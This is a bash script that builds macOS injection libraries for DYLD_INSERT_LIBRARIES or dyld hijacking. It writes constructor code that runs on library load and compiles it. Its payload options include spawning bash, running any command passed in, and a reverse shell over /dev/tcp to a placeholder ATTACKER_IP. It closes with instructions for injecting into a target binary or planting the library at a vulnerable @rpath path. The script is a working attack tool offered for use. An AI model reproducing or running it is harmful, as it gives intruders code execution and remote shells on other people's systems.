#!/bin/bash
# macOS Injection Library Creator
# Creates dynamic libraries for DYLD_INSERT_LIBRARIES or dyld hijacking

set -e

# Default values
OUTPUT="inject.dylib"
ACTION="execv /bin/bash"
VERSION_CURRENT="1.0"
VERSION_COMPAT="1.0"
REEXPORT_LIB=""
VERBOSE=0

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --output)
            OUTPUT="$2"
            shift 2
            ;;
        --action)
            ACTION="$2"
            shift 2
            ;;
        --current-version)
            VERSION_CURRENT="$2"
            shift 2
            ;;
        --compatibility-version)
            VERSION_COMPAT="$2"
            shift 2
            ;;
        --reexport)
            REEXPORT_LIB="$2"
            shift 2
            ;;
        --verbose|-v)
            VERBOSE=1
            shift
            ;;
        --help|-h)
            echo "Usage: $0 [OPTIONS]"
            echo ""
            echo "Options:"
            echo "  --output <file>           Output dylib filename (default: inject.dylib)"
            echo "  --action <command>        Action to perform (default: execv /bin/bash)"
            echo "  --current-version <ver>   Current version (default: 1.0)"
            echo "  --compatibility-version <ver> Compatibility version (default: 1.0)"
            echo "  --reexport <path>       Reexport another library (for hijacking)"
            echo "  --verbose, -v           Verbose output"
            echo "  --help, -h              Show this help"
            echo ""
            echo "Examples:"
            echo "  $0 --output inject.dylib --action 'execv /bin/bash'"
            echo "  $0 --output lib.dylib --reexport /path/to/legit/lib.dylib"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

if [ $VERBOSE -eq 1 ]; then
    echo "Creating injection library: $OUTPUT"
    echo "Action: $ACTION"
    echo "Current version: $VERSION_CURRENT"
    echo "Compatibility version: $VERSION_COMPAT"
    [ -n "$REEXPORT_LIB" ] && echo "Reexport: $REEXPORT_LIB"
fi

# Create temporary directory for source files
TMP_DIR=$(mktemp -d)
trap "rm -rf $TMP_DIR" EXIT

# Generate C source for basic injection
cat > "$TMP_DIR/inject.c" << 'EOF'
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
    printf("[+] dylib injected in %s\n", argv[0]);
EOF

# Add action based on type
if [ "$ACTION" = "execv /bin/bash" ]; then
    cat >> "$TMP_DIR/inject.c" << 'EOF'
    execv("/bin/bash", 0);
EOF
elif [ "$ACTION" = "spawn_shell" ]; then
    cat >> "$TMP_DIR/inject.c" << 'EOF'
    system("/bin/bash -i");
EOF
elif [ "$ACTION" = "reverse_shell" ]; then
    cat >> "$TMP_DIR/inject.c" << 'EOF'
    system("/bin/bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1");
EOF
    echo "[!] Remember to replace ATTACKER_IP and ATTACKER_PORT in the source"
else
    cat >> "$TMP_DIR/inject.c" << EOF
    system("$ACTION");
EOF
fi

cat >> "$TMP_DIR/inject.c" << 'EOF'
}
EOF

# Generate Objective-C source for hijacking (with Foundation for NSLog)
if [ -n "$REEXPORT_LIB" ]; then
    cat > "$TMP_DIR/lib.m" << 'EOF'
#import <Foundation/Foundation.h>

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"[+] dylib hijacked in %s", argv[0]);
EOF
    
    if [ "$ACTION" != "log_only" ]; then
        cat >> "$TMP_DIR/lib.m" << EOF
    system("$ACTION");
EOF
    fi
    
    cat >> "$TMP_DIR/lib.m" << 'EOF'
}
EOF
fi

# Compile the library
if [ -n "$REEXPORT_LIB" ]; then
    # Hijacking mode with reexport
    echo "[+] Compiling hijacking library with reexport..."
    gcc -dynamiclib \
        -current_version "$VERSION_CURRENT" \
        -compatibility_version "$VERSION_COMPAT" \
        -framework Foundation \
        "$TMP_DIR/lib.m" \
        -Wl,-reexport_library,"$REEXPORT_LIB" \
        -o "$OUTPUT"
    
    echo "[+] Library compiled: $OUTPUT"
    echo ""
    echo "[!] The reexport path may be relative. Check with:"
    echo "    otool -l $OUTPUT | grep REEXPORT -A 2"
    echo ""
    echo "[!] If needed, fix the path with:"
    echo "    install_name_tool -change @rpath/libname.dylib /absolute/path $OUTPUT"
else
    # Basic injection mode
    echo "[+] Compiling injection library..."
    gcc -dynamiclib -o "$OUTPUT" "$TMP_DIR/inject.c"
    
    echo "[+] Library compiled: $OUTPUT"
fi

echo ""
echo "Usage:"
echo "  DYLD_INSERT_LIBRARIES=$OUTPUT ./target_binary"
echo ""
echo "Or for hijacking, copy to the vulnerable @rpath location:"
echo "  cp $OUTPUT /path/to/vulnerable/location/"
